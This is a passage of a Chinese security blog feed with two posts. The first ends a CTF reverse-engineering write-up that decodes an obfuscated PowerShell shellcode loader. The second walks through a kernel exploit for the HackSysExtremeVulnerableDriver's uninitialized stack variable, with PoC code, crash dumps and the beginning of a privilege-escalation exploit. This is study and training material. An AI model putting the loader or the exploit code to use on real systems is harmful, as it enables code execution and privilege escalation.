MAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGUAbgB2ADoAbAArACQAZQBuAHYAOgBPACkAOwAkAGEAPQBHAGUAdAAtAEQAYQB0AGUAOwBpAGYAKAAkAGEALgBNAG8AbgB0AGgAIAAtAGcAZQAgADIAKQB7AGUAeABpAHQAOwB9AFsAVQBpAG4AdAAzADIAWwBdAF0AIAAkAG8AcAA9ADAAOwAkAHIAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKQAsACgAZwBkAGUAbABlAGcAYQB0AGUAIABAACgAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBVAEkAbgB0ADMAMgBbAF0AXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQAuAEkAbgB2AG8AawBlACgAJABzAGMAMwAyACwAJABzAGMAMwAyAC4ATABlAG4AZwB0AGgALAAwAHgANAAwACwAJABvAHAAKQA7AGkAZgAoACQAcgAgAC0AZQBxACAAMAApAHsAJABwAHIAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwApACwAKABnAGQAZQBsAGUAZwBhAHQAZQAgAEAAKABbAEkAbgB0AFAAdAByAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0ALABbAFUASQBuAHQAMwAyAF0AKQAgACgAWwBVAEkAbgB0ADMAMgBdACkAKQApACkALgBJAG4AdgBvAGsAZQAoADAALAAkAHMAYwAzADIALgBMAGUAbgBnAHQAaAAsADAAeAAzADAAMAAwACwAMAB4ADQAMAApADsAaQBmACgAJABwAHIAIAAtAG4AZQAgADAAKQB7ACQAbQBlAG0AcwBlAHQAPQAoAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEcAZQB0AEQAZQBsAGUAZwBhAHQAZQBGAG8AcgBGAHUAbgBjAHQAaQBvAG4AUABvAGkAbgB0AGUAcgAoACgAZwBwAHIAbwBjACAAbQBzAHYAYwByAHQALgBkAGwAbAAgAG0AZQBtAHMAZQB0ACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQA7AGYAbwByACAAKAAkAGkAPQAwADsAJABpACAALQBsAGUAIAAoACQAcwBjADMAMgAuAEwAZQBuAGcAdABoAC0AMQApADsAJABpACsAKwApACAAewAkAG0AZQBtAHMAZQB0AC4ASQBuAHYAbwBrAGUAKAAoACQAcAByACsAJABpACkALAAgACQAcwBjADMAMgBbACQAaQBdACwAIAAxACkAfQA7ACgAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoARwBlAHQARABlAGwAZQBnAGEAdABlAEYAbwByAEYAdQBuAGMAdABpAG8AbgBQAG8AaQBuAHQAZQByACgAKABnAHAAcgBvAGMAIABrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACkALAAoAGcAZABlAGwAZQBnAGEAdABlACAAQAAoAFsASQBuAHQAUAB0AHIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsAVQBJAG4AdAAzADIAXQAsAFsASQBuAHQAUAB0AHIAXQApACAAKABbAEkAbgB0AFAAdAByAF0AKQApACkAKQAuAEkAbgB2AG8AawBlACgAMAAsADAALAAkAHAAcgAsACQAcAByACwAMAAsADAAKQA7AH0AfQBlAGwAcwBlAHsAKABbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlAGcAYQB0AGUARgBvAHIARgB1AG4AYwB0AGkAbwBuAFAAbwBpAG4AdABlAHIAKAAoAGcAcAByAG8AYwAgAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACAAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKQAsACgAZwBkAGUAbABlAGcAYQB0AGUAIABAACgAWwBJAG4AdABQAHQAcgBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBCAHkAdABlAFsAXQBdACwAWwBVAEkAbgB0ADMAMgBdACwAWwBJAG4AdABQAHQAcgBdACkAIAAoAFsASQBuAHQAUAB0AHIAXQApACkAKQApAC4ASQBuAHYAbwBrAGUAKAAwACwAMAAsACQAcwBjADMAMgAsACQAcwBjADMAMgAsADAALAAwACkAOwB9AHMAbABlAGUAcAAoADEAMgAwADAAKQA7AH0AYwBhAHQAYwBoAHsAfQBlAHgAaQB0ADsA&quot;for k in xrange(24): front = ''.join(chr(ord(c) - k) for c in 'fzEvD') try: out = base64.b64decode('{}{}'.format(front, base)).replace('\\x00', '') print &quot;%d---&gt;%s&quot; % (k,out) except Exception,e: passfront = ''.join(chr(ord(c) - 3) for c in 'fzEvD')out = base64.b64decode('{}{}'.format(front, base)).replace('\\x00', '')with open('final.bat','w+') as f: f.write(out) 根据结果，发现hour是3，最后得到解码后的脚本 123456789101112131415161718192021222324252627282930313233343536373839sleep(90);try{ function gdelegate{ Param ([Parameter(Position=0,Mandatory=$True)] [Type[]] $Parameters,[Parameter(Position=1)] [Type] $ReturnType=[Void]); $TypeBuilder=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&quot;ReflectedDelegate&quot;)),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&quot;InMemoryModule&quot;,$false).DefineType(&quot;XXX&quot;,&quot;Class,Public,Sealed,AnsiClass,AutoClass&quot;,[System.MulticastDelegate]); $TypeBuilder.DefineConstructor(&quot;RTSpecialName,HideBySig,Public&quot;,[System.Reflection.CallingConventions]::Standard,$Parameters).SetImplementationFlags(&quot;Runtime,Managed&quot;); $TypeBuilder.DefineMethod(&quot;Invoke&quot;,&quot;Public,HideBySig,NewSlot,Virtual&quot;,$ReturnType,$Parameters).SetImplementationFlags(&quot;Runtime,Managed&quot;); return $TypeBuilder.CreateType(); } function gproc{Param ([Parameter(Position=0,Mandatory=$True)] [String] $Module,[Parameter(Position=1,Mandatory=$True)] [String] $Procedure); $SystemAssembly=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split(&quot;\\&quot;)[-1].Equals(&quot;System.dll&quot;)}; $UnsafeNativeMethods=$SystemAssembly.GetType(&quot;Microsoft.Win32.UnsafeNativeMethods&quot;);return $UnsafeNativeMethods.GetMethod(&quot;GetProcAddress&quot;).Invoke($null,@([System,@NRuntime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),$UnsafeNativeMethods.GetMethod(&quot;GetModuleHandle&quot;).Invoke($null,@($Module)))),$Procedure)); } [Byte[]]$sc32 = [System.Convert]::FromBase64String($env:l+$env:O); $a=Get-Date; if($a.Month -ge 2){ exit; } [Uint32[]] $op=0; $r=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualProtect),(gdelegate @([Byte[]],[UInt32],[UInt32],[UInt32[]]) ([IntPtr])))).Invoke($sc32,$sc32.Length,0x40,$op); if($r -eq 0){$pr=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualAlloc),(gdelegate @([IntPtr],[UInt32],[UInt32],[UInt32]) ([UInt32])))).Invoke(0,$sc32.Length,0x3000,0x40); if($pr -ne 0){ $memset=([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc msvcrt.dll memset),(gdelegate @([UInt32],[UInt32],[UInt32]) ([IntPtr])))); for ($i=0;$i -le ($sc32.Length-1);$i++) { $memset.Invoke(($pr+$i), $sc32[$i], 1) }; ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate @([IntPtr],[UInt32],[UInt32],[UInt32],[UInt32],[IntPtr]) ([IntPtr])))).Invoke(0,0,$pr,$pr,0,0); } }else{ ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate @([IntPtr],[UInt32],[Byte[]],[Byte[]],[UInt32],[IntPtr]) ([IntPtr])))).Invoke(0,0,$sc32,$sc32,0,0); } sleep(1200); }catch{}exit; 分析可以得到，就是解码shellcode执行的。 1234set l=2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JC%j:~1,1%14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+set m=moAsSAMOY%02maCkAOwBsdf%smadfdf9z///+qamogG8AZABSDGsaSSwhmzWMOYsA+/masdgmoKYqWTAGEAaQBuAC4ARAB//IAbA==set n=LABNAmaodSDGASJOIHGI76msdm%ls:1qwerATSAYUDBGOSSnsAMIOLM//sogs+AuAFasgqQQYYHAFAZ2%:~QBtAGIAbABdABEA+set o=JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg= 同样适用echo的方法得到shellcode的部分 12eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg= 12345678# muhe @ muheMBP in ~ [23:07:13]$ pythonPython 2.7.10 (default, Feb 7 2017, 00:08:15)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwinType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import base64&gt;&gt;&gt; base64.b64decode(&quot;2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg=&quot;)'\\xd9\\xeb\\x9b\\xd9t$\\xf41\\xd2\\xb2w1\\xc9d\\x8bq0\\x8bv\\x0c\\x8bv\\x1c\\x8bF\\x08\\x8b~ \\x8b68O\\x18u\\xf3Y\\x01\\xd1\\xff\\xe1`\\x8bl$$\\x8bE&lt;\\x8bT(x\\x01\\xea\\x8bJ\\x18\\x8bZ \\x01\\xeb\\xe34I\\x8b4\\x8b\\x01\\xee1\\xff1\\xc0\\xfc\\xac\\x84\\xc0t\\x07\\xc1\\xcf\\r\\x01\\xc7\\xeb\\xf4;|$(u\\xe1\\x8bZ$\\x01\\xebf\\x8b\\x0cK\\x8bZ\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\\x89D$\\x1ca\\xc3\\xb2\\x08)\\xd4\\x89\\xe5\\x89\\xc2h\\x8eN\\x0e\\xecR\\xe8\\x9f\\xff\\xff\\xff\\x89E\\x04\\xbb~\\xd8\\xe2s\\x87\\x1c$R\\xe8\\x8e\\xff\\xff\\xff\\x89E\\x08hll Ah32.dhuser0\\xdb\\x88\\\\$\\n\\x89\\xe6V\\xffU\\x04\\x89\\xc2P\\xbb\\xa8\\xa2M\\xbc\\x87\\x1c$R\\xe8_\\xff\\xff\\xffhroX hdMichTren1\\xdb\\x88\\\\$\\n\\x89\\xe3h!}X hgainhsMeAh!ItIhherehlloThF{HehTMCT1\\xc9\\x88L$\\x1e\\x89\\xe11\\xd2RSQR\\xff\\xd01\\xc0P\\xffU\\x08' 可以看到字符串…重定向到文件 strings一下就看到flag了。","link":"/2017/06/28/TrendMicro-CTF-2017-Reverse300/"},{"title":"Windows-Kernel-Exploit-Study(3)","text":"0x00:这是HEVD系列中关于栈上变量未初始化的一种利用，在kernel的exploit中，这种情况很少发生，作为一个demo可以体会一下对于这种漏洞的Kernel stack spray的利用方式。在UAF的漏洞中，我们常常使用heap spray的方式去利用，然而Kernel stack spray差不多，不过是提前把数据”喷射”到内核栈，占据未初始化的变量的位置，如果是一个函数指针，那么我们就可以劫持这个函数，调用，去执行shellcode，从而完成提权。 关于环境及工具： windows7 cn x86 windbg osrloader 0x01:先来看vuln代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869VOID UninitializedStackVariableObjectCallback() { PAGED_CODE(); DbgPrint(&quot;[+] Uninitialized Stack Variable Object Callback\\n&quot;);}/// &lt;summary&gt;/// Trigger the Uninitialized Stack Variable Vulnerability/// &lt;/summary&gt;/// &lt;param name=&quot;UserBuffer&quot;&gt;The pointer to user mode buffer&lt;/param&gt;/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;NTSTATUS TriggerUninitializedStackVariable(IN PVOID UserBuffer) { ULONG UserValue = 0; ULONG MagicValue = 0xBAD0B0B0; NTSTATUS Status = STATUS_SUCCESS;#ifdef SECURE // Secure Note: This is secure because the developer is properly initializing // UNINITIALIZED_STACK_VARIABLE to NULL and checks for NULL pointer before calling // the callback UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable = {0};#else // Vulnerability Note: This is a vanilla Uninitialized Stack Variable vulnerability // because the developer is not initializing 'UNINITIALIZED_STACK_VARIABLE' structure // before calling the callback when 'MagicValue' does not match 'UserValue' UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable;#endif PAGED_CODE(); __try { // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, sizeof(UNINITIALIZED_STACK_VARIABLE), (ULONG)__alignof(UNINITIALIZED_STACK_VARIABLE)); // Get the value from user mode UserValue = *(PULONG)UserBuffer; DbgPrint(&quot;[+] UserValue: 0x%p\\n&quot;, UserValue); DbgPrint(&quot;[+] UninitializedStackVariable Address: 0x%p\\n&quot;, &amp;UninitializedStackVariable); // Validate the magic value // 如果我们传递的UserValue和这个MagicVule相同才会走这里。 if (UserValue == MagicValue) { UninitializedStackVariable.Value = UserValue; UninitializedStackVariable.Callback = &amp;UninitializedStackVariableObjectCallback; } DbgPrint(&quot;[+] UninitializedStackVariable.Value: 0x%p\\n&quot;, UninitializedStackVariable.Value); DbgPrint(&quot;[+] UninitializedStackVariable.Callback: 0x%p\\n&quot;, UninitializedStackVariable.Callback);#ifndef SECURE DbgPrint(&quot;[+] Triggering Uninitialized Stack Variable Vulnerability\\n&quot;);#endif // Call the callback function //如果前面UserValue和MageValue不一样的时候，callback没被赋值的，直接调用就会出问题。 if (UninitializedStackVariable.Callback) { UninitializedStackVariable.Callback(); } } __except (EXCEPTION_EXECUTE_HANDLER) { Status = GetExceptionCode(); DbgPrint(&quot;[-] Exception Code: 0x%X\\n&quot;, Status); } return Status;} 我们传递一个非MagicValue的值，UninitializedStackVariable.Callback就是一个未定的值，后面直接调用，就可能会直接崩溃。 0x02:调试设置好win7 kernel调试相关的设置，挂载上驱动。PoC代码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455HANDLE GetDeviceHandle(LPCSTR DeviceName){ HANDLE hDriver = CreateFileA(DeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); return hDriver;}int _tmain(int argc, _TCHAR* argv[]) { ULONG BytesReturned; HANDLE hFile = NULL; ULONG MagicValue = 0xBAADF00D; LPCSTR lpDeviceName = (LPCSTR)&quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot;; __try { hFile = GetDeviceHandle(lpDeviceName); if (hFile == INVALID_HANDLE_VALUE) { printf(&quot;\\t\\t[-] Failed Getting Device Handle: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { printf(&quot;\\t\\t[+] Device Handle: 0x%X\\n&quot;, hFile); } StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,StackSprayBufferSize); if(!StackSprayBuffer){ printf(&quot;Alloc buffer error : 0x%X&quot;,GetLastError()); } DeviceIoControl(hFile, HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE, (LPVOID)&amp;MagicValue, 0, NULL, 0, &amp;BytesReturned, NULL); HeapFree(GetProcessHeap(),0,(LPVOID)StackSprayBuffer); //set ptr NULL StackSprayBuffer = NULL; } __except (EXCEPTION_EXECUTE_HANDLER) { printf(&quot;\\t\\t[-] Exception: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } return 0;} Windbg设置后 1!gflag +soe 为了调试到触发vuln的部分的代码，采用的方式是结合IDA，查看函数的offset，结合HEVD模块的加载基地址，去下断点，断在有漏洞的函数那里。 之后捕获到crash 123456789101112131415161718192021222324252627282930313233343536373839404142kd&gt; !gflag +soeNew NtGlobalFlag contents: 0x00000001 soe - Stop On Exceptionkd&gt; gAccess violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.00000000 ?? ???kd&gt; dps esp9adb9ab0 75abe00b9adb9ab4 8eff4f94*** ERROR: Module load completed but symbols could not be loaded for HEVD.sys HEVD+0x4f949adb9ab8 1424bcc89adb9abc 87c869809adb9ac0 87c869f09adb9ac4 8eff5ca4 HEVD+0x5ca49adb9ac8 83ec88c8 nt!MiExchangeWsle+0x7c9adb9acc 75abe0059adb9ad0 0000014f9adb9ad4 00000000 ----&gt; CallBack函数9adb9ad8 c080327c9adb9adc 004330099adb9ae0 000000019adb9ae4 0000015d9adb9ae8 9adb9b149adb9aec 83ec8a26 nt!MiSwapWslEntries+0x14c9adb9af0 004330099adb9af4 0000014f9adb9af8 75abe0019adb9afc 0000014f9adb9b00 c08020009adb9b04 85da59289adb9b08 000000019adb9b0c 000000599adb9b10 000000009adb9b14 9adb9b409adb9b18 83ec6397 nt!MiUpdateWsle+0x12d9adb9b1c 0000014f9adb9b20 0000015d9adb9b24 85d6d6c09adb9b28 0000015d9adb9b2c 85d6d6c0 可以看到调用了 0x00000000，然而这个地址是个非法地址，所以crash。挺奇怪的是这个时候g命令还可以继续走…所以我又跑了一次PoC。我第二次运行PoC获得的信息如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189kd&gt; !analyze -v******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************PAGE_FAULT_IN_NONPAGED_AREA (50)Invalid system memory was referenced. This cannot be protected by try-except.Typically the address is just plain bad or it is pointing at freed memory.Arguments:Arg1: ffffffdd, memory referenced.Arg2: 00000001, value 0 = read operation, 1 = write operation.Arg3: 59477005, If non-zero, the instruction address which referenced the bad memory address.Arg4: 00000000, (reserved)Debugging Details:------------------DUMP_CLASS: 1DUMP_QUALIFIER: 0BUILD_VERSION_STRING: 6.1.7600.16385 (win7_rtm.090713-1255)DUMP_TYPE: 0BUGCHECK_P1: ffffffffffffffddBUGCHECK_P2: 1BUGCHECK_P3: 59477005BUGCHECK_P4: 0WRITE_ADDRESS: ffffffdd FAULTING_IP: MSVCR110D!_ioinitCallback+1e559477005 0068dd add byte ptr [eax-23h],chMM_INTERNAL_CODE: 0CPU_COUNT: 1CPU_MHZ: af1CPU_VENDOR: GenuineIntelCPU_FAMILY: 6CPU_MODEL: 3cCPU_STEPPING: 3CPU_MICROCODE: 6,3c,3,0 (F,M,S,R) SIG: 1E'00000000 (cache) 1E'00000000 (init)DEFAULT_BUCKET_ID: WIN7_DRIVER_FAULTBUGCHECK_STR: 0x50PROCESS_NAME: test.exeCURRENT_IRQL: 2ANALYSIS_SESSION_HOST: MUHE-PCANALYSIS_SESSION_TIME: 02-04-2017 19:46:44.0573ANALYSIS_VERSION: 10.0.14321.1024 x86freTRAP_FRAME: 8d47ea40 -- (.trap 0xffffffff8d47ea40)ErrCode = 00000002eax=00000000 ebx=94f53ca4 ecx=0024f9f0 edx=00000065 esi=baadf00d edi=00000000eip=59477005 esp=8d47eab4 ebp=8d47ebd4 iopl=0 nv up ei pl nz na pe nccs=0008 ss=0010 ds=0023 es=0023 fs=0030 gs=0000 efl=00010206MSVCR110D!_ioinitCallback+0x1e5:59477005 0068dd add byte ptr [eax-23h],ch ds:0023:ffffffdd=??Resetting default scopeMISALIGNED_IP: MSVCR110D!_ioinitCallback+1e559477005 0068dd add byte ptr [eax-23h],chLAST_CONTROL_TRANSFER: from 83ee5e71 to 83e74394STACK_TEXT: 8d47e58c 83ee5e71 00000003 dbca9caa 00000065 nt!RtlpBreakWithStatusInstruction8d47e5dc 83ee696d 00000003 86557030 00000000 nt!KiBugCheckDebugBreak+0x1c8d47e9a0 83e8e8e3 00000050 ffffffdd 00000001 nt!KeBugCheck2+0x68b8d47ea28 83e4f5f8 00000001 ffffffdd 00000000 nt!MmAccessFault+0x1068d47ea28 59477005 00000001 ffffffdd 00000000 nt!KiTrap0E+0xdc8d47ebd4 94f52fe8 0024f9f0 8d47ebfc 94f53219 MSVCR110D!_ioinitCallback+0x1e5WARNING: Stack unwind information not available. Following frames may be wrong.8d47ebe0 94f53219 878eb928 878eb998 85d8bf80 HEVD+0x4fe88d47ebfc 83e454bc 878bbbb0 878eb928 878eb928 HEVD+0x52198d47ec14 84046eee 85d8bf80 878eb928 878eb998 nt!IofCallDriver+0x638d47ec34 84063cd1 878bbbb0 85d8bf80 00000000 nt!IopSynchronousServiceTail+0x1f88d47ecd0 840664ac 878bbbb0 878eb928 00000000 nt!IopXxxControlFile+0x6aa8d47ed04 83e4c42a 0000001c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a8d47ed04 76e464f4 0000001c 00000000 00000000 nt!KiFastCallEntry+0x12a0024f828 76e44cac 74fda08f 0000001c 00000000 ntdll!KiFastSystemCallRet0024f82c 74fda08f 0000001c 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc0024f88c 76c0ec25 0000001c 0022202f 0024f9f0 KERNELBASE!DeviceIoControl+0xf60024f8b8 013e1612 0000001c 0022202f 0024f9f0 kernel32!DeviceIoControlImplementation+0x800024fa34 013e1cc9 00000001 00350598 00351ba8 test+0x116120024fa84 013e1ebd 0024fa98 76c11174 7ffd4000 test+0x11cc90024fa8c 76c11174 7ffd4000 0024fad8 76e5b3f5 test+0x11ebd0024fa98 76e5b3f5 7ffd4000 76c02850 00000000 kernel32!BaseThreadInitThunk+0xe0024fad8 76e5b3c8 013e1082 7ffd4000 00000000 ntdll!__RtlUserThreadStart+0x700024faf0 00000000 013e1082 7ffd4000 00000000 ntdll!_RtlUserThreadStart+0x1bSTACK_COMMAND: kbTHREAD_SHA1_HASH_MOD_FUNC: b2a297aada69e6279fdc3daae6f4a22cf686509aTHREAD_SHA1_HASH_MOD_FUNC_OFFSET: 4f005ee17e97a074c7da84fec24b29c43a55219cTHREAD_SHA1_HASH_MOD: c3a8502bd33e9f58cfa688b5c9397c7eefe7acfaFOLLOWUP_IP: HEVD+4fe894f52fe8 5d pop ebpFAULT_INSTR_CODE: 8c25dSYMBOL_STACK_INDEX: 6SYMBOL_NAME: HEVD+4fe8FOLLOWUP_NAME: MachineOwnerIMAGE_NAME: hardwareDEBUG_FLR_IMAGE_TIMESTAMP: 0MODULE_NAME: hardwareFAILURE_BUCKET_ID: IP_MISALIGNEDBUCKET_ID: IP_MISALIGNEDPRIMARY_PROBLEM_CLASS: IP_MISALIGNEDTARGET_TIME: 2017-02-04T11:45:48.000ZOSBUILD: 7600OSSERVICEPACK: 16385SERVICEPACK_NUMBER: 0OS_REVISION: 0SUITE_MASK: 272PRODUCT_TYPE: 1OSPLATFORM_TYPE: x86OSNAME: Windows 7OSEDITION: Windows 7 WinNt TerminalServer SingleUserTSOS_LOCALE: USER_LCID: 0OSBUILD_TIMESTAMP: 2009-07-14 07:15:19BUILDDATESTAMP_STR: 090713-1255BUILDLAB_STR: win7_rtmBUILDOSVER_STR: 6.1.7600.16385ANALYSIS_SESSION_ELAPSED_TIME: 2f92ANALYSIS_SOURCE: KMFAILURE_ID_HASH_STRING: km:ip_misalignedFAILURE_ID_HASH: {201b0e5d-db2a-63d2-77be-8ce8ff234750}Followup: MachineOwner--------- 这里g之后就是直接蓝屏了。 0x03:利用思路大致的利用思路如下： 布置内核栈 触发漏洞 提权 关于内核栈的布置，使用的是出自j00ru文章的方法，这里直接使用了HEVD的exploit，我只做一点分析。 0x04:Exploit分析HEVD 里的 Exploit代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264#include &quot;UninitializedStackVariable.h&quot;VOID ResolveKernelAPIs() { PCHAR KernelImage; SIZE_T ReturnLength; HMODULE hNtDll = NULL; PVOID HalDispatchTable = NULL; HMODULE hKernelInUserMode = NULL; PVOID KernelBaseAddressInKernelMode; NTSTATUS NtStatus = STATUS_UNSUCCESSFUL; PSYSTEM_MODULE_INFORMATION pSystemModuleInformation; DEBUG_INFO(&quot;\\t\\t[+] Resolving Kernel APIs\\n&quot;); hNtDll = LoadLibrary(&quot;ntdll.dll&quot;); if (!hNtDll) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed To Load NtDll.dll: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtDll, &quot;NtQuerySystemInformation&quot;); if (!NtQuerySystemInformation) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving NtQuerySystemInformation: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t\\t[+] NtQuerySystemInformation: 0x%p\\n&quot;, NtQuerySystemInformation); } NtMapUserPhysicalPages = (NtMapUserPhysicalPages_t)GetProcAddress(hNtDll, &quot;NtMapUserPhysicalPages&quot;); if (!NtMapUserPhysicalPages) { DEBUG_ERROR(&quot;\\t\\t\\t[-] Failed Resolving NtMapUserPhysicalPages: 0x%X\\n&quot;, GetLastError()); exit(EXIT_FAILURE); } else { DEBUG_INFO(&quot;\\t\\t\\t[+] NtMapUserPhysicalPages: 0x%p\\n&quot;, NtMapUserPhysicalPages); } NtStatus = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &amp;ReturnLength); // Allocate the Heap chunk pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ReturnLength); if (!pSystemModuleInformation) { 